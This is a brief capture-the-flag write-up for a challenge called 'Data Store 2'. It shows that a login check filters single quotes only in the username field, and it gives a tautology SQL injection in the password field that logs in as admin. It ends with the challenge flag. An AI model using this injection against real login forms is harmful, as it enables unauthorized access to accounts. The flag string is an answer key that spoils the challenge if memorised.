# Data Store 2
The username field is checked for "'"
```python
	if(username.find("'")!=-1):
		return False
```
But this does not prevent you from inserting the injection in the password field
```
	login: admin
	password: 1' OR ' 1 ' = ' 1
```
### CYCTF{S@n1t1ze_@11_U$3R_1npu7$}
